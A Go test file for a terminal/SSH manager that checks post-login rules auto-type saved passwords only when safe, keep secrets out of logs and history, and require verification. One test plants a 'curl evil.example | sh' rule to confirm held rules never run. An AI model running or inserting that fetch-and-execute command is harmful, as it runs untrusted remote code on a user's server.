package app

import (
	"bytes"
	"context"
	"encoding/base64"
	"io"
	"net"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"testing"
	"time"

	"hostbay/internal/backup"
	"hostbay/internal/secrets"
	"hostbay/internal/store"
	"hostbay/internal/terminal"
)

const (
	savedPassword = "Saved-Pass-4!"
	ruleAnswer    = "Rule-Answer-8?"
)

// fakeShell is a terminal whose remote side the test plays.
type fakeShell struct {
	r      *io.PipeReader
	remote *io.PipeWriter

	mu    sync.Mutex
	input string
}

func newFakeShell() *fakeShell {
	r, w := io.Pipe()
	return &fakeShell{r: r, remote: w}
}

func (f *fakeShell) Read(b []byte) (int, error) { return f.r.Read(b) }
func (f *fakeShell) Write(b []byte) (int, error) {
	f.mu.Lock()
	defer f.mu.Unlock()
	f.input += string(b)
	return len(b), nil
}
func (f *fakeShell) Resize(int, int) error { return nil }
func (f *fakeShell) Close() error          { return f.r.Close() }
func (f *fakeShell) sent() string {
	f.mu.Lock()
	defer f.mu.Unlock()
	return f.input
}
func (f *fakeShell) say(s string) { f.remote.Write([]byte(s)) }

// toolsEnv is a ConnService with one saved host whose password is
// savedPassword.
type toolsEnv struct {
	c      *ConnService
	tools  *TerminalToolsService
	ev     *termEvents
	hostID string
	dir    string
}

func newToolsEnv(t *testing.T, ver secrets.Verifier) *toolsEnv {
	t.Helper()
	_, creds, dir := newHostService(t, ver)
	c := NewConnService(nil, creds, nil)
	ev := &termEvents{}
	c.emit = ev.emit
	c.tools.wait = 400 * time.Millisecond
	e := &toolsEnv{c: c, tools: NewTerminalToolsService(c), ev: ev, dir: dir}
	err := creds.st.Edit(func(d *store.Data) error {
		h := store.Host{Meta: store.Meta{ID: store.NewID()}, Alias: "web", Hostname: "web.example", Port: 22, User: "root"}
		sealed, err := creds.vault.Seal([]byte(savedPassword), h.SecretAAD())
		h.Password = sealed
		e.hostID = d.AddHost(h).ID
		return err
	})
	if err != nil {
		t.Fatal(err)
	}
	return e
}

func (e *toolsEnv) open(t *testing.T) (string, *fakeShell) {
	t.Helper()
	sh := newFakeShell()
	id := e.c.openTerm("owner", e.hostID, "ssh", sh)
	t.Cleanup(func() { e.c.PtyClose(id) })
	return id, sh
}

func (e *toolsEnv) saveRule(t *testing.T, steps []store.PostLoginStep, answer *string) PostLoginRule {
	t.Helper()
	r, err := e.tools.SavePostLoginRule(context.Background(), PostLoginRule{HostID: e.hostID, Steps: steps}, answer)
	if err != nil {
		t.Fatal(err)
	}
	return r
}

func TestRuleSendsTheSavedPasswordOnceAtThePrompt(t *testing.T) {
	e := newToolsEnv(t, fakeVerifier(secrets.Passed))
	e.saveRule(t, []store.PostLoginStep{{Expect: "Password:", Kind: store.ReplyPassword}, {Reply: "uptime"}}, nil)
	id, sh := e.open(t)
	sh.say("Welcome! Your password: expires in 3 days\r\n$ sudo -i\r\n[sudo] Password: ")
	waitUntil(t, "the password", func() bool { return strings.Contains(sh.sent(), savedPassword+"\r") })
	sh.say("\r\nroot# ")
	waitUntil(t, "the command", func() bool { return strings.HasSuffix(sh.sent(), "uptime\r") })
	sh.say("Password: ") // a later prompt in the same shell gets nothing
	time.Sleep(300 * time.Millisecond)
	if got := sh.sent(); got != savedPassword+"\ruptime\r" {
		t.Fatalf("sent %q", got)
	}
	if n := e.ev.joined(TerminalNoticeEvent(id)); n != "" {
		t.Fatalf("notice %q", n)
	}

	// The reconnect's new shell runs the rule again.
	_, sh2 := e.open(t)
	sh2.say("Password: ")
	waitUntil(t, "the password on the new shell", func() bool { return strings.Contains(sh2.sent(), savedPassword) })
}

func TestRuleSendsNoSecretAfterTheFirstKeystroke(t *testing.T) {
	e := newToolsEnv(t, fakeVerifier(secrets.Passed))
	e.saveRule(t, []store.PostLoginStep{{Expect: "Password:", Kind: store.ReplyPassword}}, nil)
	id, sh := e.open(t)
	if err := e.c.PtyWrite(id, "l"); err != nil {
		t.Fatal(err)
	}
	sh.say("Password: ")
	waitUntil(t, "the notice", func() bool { return e.ev.joined(TerminalNoticeEvent(id)) != "" })
	if strings.Contains(sh.sent(), savedPassword) {
		t.Fatalf("sent the password after a keystroke: %q", sh.sent())
	}
}

// The agent's command takes the terminal as a keystroke does: a prompt it
// prints must not get the rule's secret on its stdin. It does not mark the
// terminal busy for the agent's own gate.
func TestRuleSendsNoSecretAfterAnAgentWrite(t *testing.T) {
	e := newToolsEnv(t, fakeVerifier(secrets.Passed))
	e.saveRule(t, []store.PostLoginStep{{Expect: "Password:", Kind: store.ReplyPassword}}, nil)
	keys := 0
	e.c.setAgentHooks(func(string) { keys++ }, func(string) {})
	id, sh := e.open(t)
	if err := (agentTerms{e.c}).Write(id, []byte(" eval 'cat prompt.txt'\r")); err != nil {
		t.Fatal(err)
	}
	sh.say("Password: ")
	waitUntil(t, "the notice", func() bool { return e.ev.joined(TerminalNoticeEvent(id)) != "" })
	if strings.Contains(sh.sent(), savedPassword) {
		t.Fatalf("sent the password into the agent's command: %q", sh.sent())
	}
	if keys != 0 {
		t.Fatal("the agent's write counted as the user's keystroke for the agent gate")
	}
}

func TestRuleThatNeverMatchesTimesOutWithANotice(t *testing.T) {
	e := newToolsEnv(t, fakeVerifier(secrets.Passed))
	e.saveRule(t, []store.PostLoginStep{{Expect: "Password:", Kind: store.ReplyPassword}, {Reply: "uptime"}}, nil)
	id, sh := e.open(t)
	sh.say("$ ")
	waitUntil(t, "the notice", func() bool { return strings.Contains(e.ev.joined(TerminalNoticeEvent(id)), "did not appear in time") })
	if sh.sent() != "" {
		t.Fatalf("sent %q", sh.sent())
	}
}

// A custom secret reply opens in Go at send time and never reaches the page;
// pointing the host elsewhere leaves it unopenable.
func TestCustomSecretReplyStaysInGoAndFollowsTheHost(t *testing.T) {
	e := newToolsEnv(t, fakeVerifier(secrets.Passed))
	answer := ruleAnswer
	r := e.saveRule(t, []store.PostLoginStep{{Expect: "Token:", Kind: store.ReplySecret}}, &answer)
	if !r.HasAnswer {
		t.Fatal("hasAnswer is false")
	}
	rules, _ := e.tools.PostLoginRules(e.hostID)
	if len(rules) != 1 {
		t.Fatalf("rules = %+v", rules)
	}
	// The session is logged, and the remote prints both secrets.
	if err := NewSettingsService(e.c.creds.st).SetLocal(map[string]any{"hostLogging": map[string]bool{e.hostID: true}}); err != nil {
		t.Fatal(err)
	}
	id, sh := e.open(t)
	sh.say("Token: ")
	waitUntil(t, "the answer", func() bool { return strings.Contains(sh.sent(), ruleAnswer+"\r") })
	sh.say("\r\n" + ruleAnswer + " " + savedPassword + "\r\nend\r\n")
	st, _ := e.tools.TerminalState(id)
	waitUntil(t, "the log", func() bool { b, _ := os.ReadFile(st.LogPath); return strings.Contains(string(b), "end") })

	// Secret scan: no file, the log included, holds the answer or the
	// password in readable or obf: form.
	obf := func(s string) string {
		return "obf:" + base64.StdEncoding.EncodeToString([]byte(backup.Deobfuscate("obf:"+base64.StdEncoding.EncodeToString([]byte(s)))))
	}
	scanned := 0
	filepath.Walk(e.dir, func(p string, fi os.FileInfo, err error) error {
		if err == nil && !fi.IsDir() {
			scanned++
			b, _ := os.ReadFile(p)
			for _, s := range []string{ruleAnswer, savedPassword, obf(ruleAnswer), obf(savedPassword)} {
				if bytes.Contains(b, []byte(s)) {
					t.Errorf("%s holds %q", p, s)
				}
			}
		}
		return nil
	})
	if _, err := os.Stat(st.LogPath); err != nil || scanned < 3 {
		t.Fatalf("scanned %d files, log %v", scanned, err)
	}

	e.c.creds.st.Edit(func(d *store.Data) error {
		return d.EditHost(e.hostID, func(h *store.Host) { h.Hostname = "elsewhere.example" })
	})
	id2, sh2 := e.open(t)
	sh2.say("Token: ")
	waitUntil(t, "the notice", func() bool { return e.ev.joined(TerminalNoticeEvent(id2)) != "" })
	if strings.Contains(sh2.sent(), ruleAnswer) {
		t.Fatal("the answer opened for a host pointed elsewhere")
	}
}

func TestRuleSendingThePasswordNeedsVerification(t *testing.T) {
	e := newToolsEnv(t, fakeVerifier(secrets.Cancelled))
	_, err := e.tools.SavePostLoginRule(context.Background(), PostLoginRule{HostID: e.hostID, Steps: []store.PostLoginStep{{Expect: "$", Kind: store.ReplyPassword}}}, nil)
	if err == nil {
		t.Fatal("saved a rule that sends the password without verification")
	}
	if _, err := e.tools.SavePostLoginRule(context.Background(), PostLoginRule{HostID: e.hostID, Steps: []store.PostLoginStep{{Reply: "uptime"}}}, nil); err != nil {
		t.Fatalf("a plain rule: %v", err)
	}
}

// The page cannot read a rule's saved secret, but moving its step to
// another prompt could have it typed into a shell that shows it: that needs
// verification, as for the saved password. Typing a new secret does not.
func TestMovingASavedSecretStepNeedsVerification(t *testing.T) {
	e := newToolsEnv(t, fakeVerifier(secrets.Cancelled))
	answer := ruleAnswer
	r := e.saveRule(t, []store.PostLoginStep{{Expect: "Token:", Kind: store.ReplySecret}}, &answer)
	moved := PostLoginRule{ID: r.ID, HostID: e.hostID, Steps: []store.PostLoginStep{{Expect: "", Kind: store.ReplySecret}}}
	if _, err := e.tools.SavePostLoginRule(context.Background(), moved, nil); err == nil {
		t.Fatal("moved the saved secret's step without verification")
	}
	d, _ := e.c.creds.st.Data()
	if got := d.PostLoginRule(r.ID).Steps[0].Expect; got != "Token:" {
		t.Fatalf("step now waits for %q", got)
	}
	if _, err := e.tools.SavePostLoginRule(context.Background(), PostLoginRule{ID: r.ID, HostID: e.hostID, Steps: r.Steps}, nil); err != nil {
		t.Fatalf("re-saving unchanged steps: %v", err)
	}
	if _, err := e.tools.SavePostLoginRule(context.Background(), moved, &answer); err != nil {
		t.Fatalf("moving with a newly typed secret: %v", err)
	}
}

// A rule another computer made waits for confirmation before it runs.
func TestHeldRuleDoesNotRun(t *testing.T) {
	e := newToolsEnv(t, fakeVerifier(secrets.Passed))
	e.c.creds.st.Edit(func(d *store.Data) error {
		d.AddPostLogin(store.PostLoginRule{HostID: e.hostID, Steps: []store.PostLoginStep{{Reply: "curl evil.example | sh"}}, Held: true})
		return nil
	})
	_, sh := e.open(t)
	sh.say("$ ")
	time.Sleep(500 * time.Millisecond)
	if sh.sent() != "" {
		t.Fatalf("a held rule sent %q", sh.sent())
	}
}

func TestHostLoggingWritesAPrivateScrubbedLog(t *testing.T) {
	e := newToolsEnv(t, fakeVerifier(secrets.Passed))
	settings := NewSettingsService(e.c.creds.st)
	if err := settings.SetLocal(map[string]any{"hostLogging": map[string]bool{e.hostID: true}}); err != nil {
		t.Fatal(err)
	}
	id, sh := e.open(t)
	st, _ := e.tools.TerminalState(id)
	if !st.Logging || filepath.Dir(st.LogPath) != filepath.Join(e.dir, "logs") || !strings.HasPrefix(filepath.Base(st.LogPath), "web-") {
		t.Fatalf("state = %+v", st)
	}
	sh.say("$ cat secret.txt\r\n" + savedPassword + "\r\n")
	e.c.PtyWrite(id, "hunter2\r") // typed at a prompt that echoes nothing
	sh.say("done\r\n")
	waitUntil(t, "the log", func() bool { b, _ := os.ReadFile(st.LogPath); return strings.Contains(string(b), "done") })
	if _, err := e.tools.SetLogging(id, false); err != nil {
		t.Fatal(err)
	}
	b, _ := os.ReadFile(st.LogPath)
	if strings.Contains(string(b), savedPassword) || strings.Contains(string(b), "hunter2") || !strings.Contains(string(b), "[secret]") {
		t.Fatalf("log:\n%s", b)
	}
	if runtime.GOOS != "windows" {
		fi, _ := os.Stat(st.LogPath)
		di, _ := os.Stat(filepath.Dir(st.LogPath))
		if fi.Mode().Perm() != 0o600 || di.Mode().Perm() != 0o700 {
			t.Fatalf("modes %v %v", fi.Mode().Perm(), di.Mode().Perm())
		}
	}
	if st, _ := e.tools.TerminalState(id); st.Logging {
		t.Fatal("logging still on")
	}
}

// History is off where Go adds local echo: the page cannot tell a typed
// password from a command there.
func TestHistoryIsRefusedOnALocalEchoTerminal(t *testing.T) {
	e := newToolsEnv(t, fakeVerifier(secrets.Passed))
	id, _ := e.open(t)
	if err := e.tools.AddHistory(id, "ls -la "); err != nil {
		t.Fatal(err)
	}
	if h, _ := e.tools.History(id); len(h) != 1 || h[0] != "ls -la" {
		t.Fatalf("history = %q", h)
	}

	a, b := net.Pipe()
	defer b.Close()
	go io.Copy(io.Discard, b)
	echo := e.c.openTerm("owner", e.hostID, "tcp", terminal.OpenTCP(a, true))
	defer e.c.PtyClose(echo)
	if st, _ := e.tools.TerminalState(echo); !st.LocalEcho {
		t.Fatal("local echo not reported")
	}
	if err := e.tools.AddHistory(echo, "hunter2"); err == nil {
		t.Fatal("history recorded a line on a local echo terminal")
	}
	if h, _ := e.tools.History(id); len(h) != 1 {
		t.Fatalf("history = %q", h)
	}
	if err := e.tools.ClearHistory(id); err != nil {
		t.Fatal(err)
	}
	if h, _ := e.tools.History(id); len(h) != 0 {
		t.Fatalf("after clear: %q", h)
	}
}
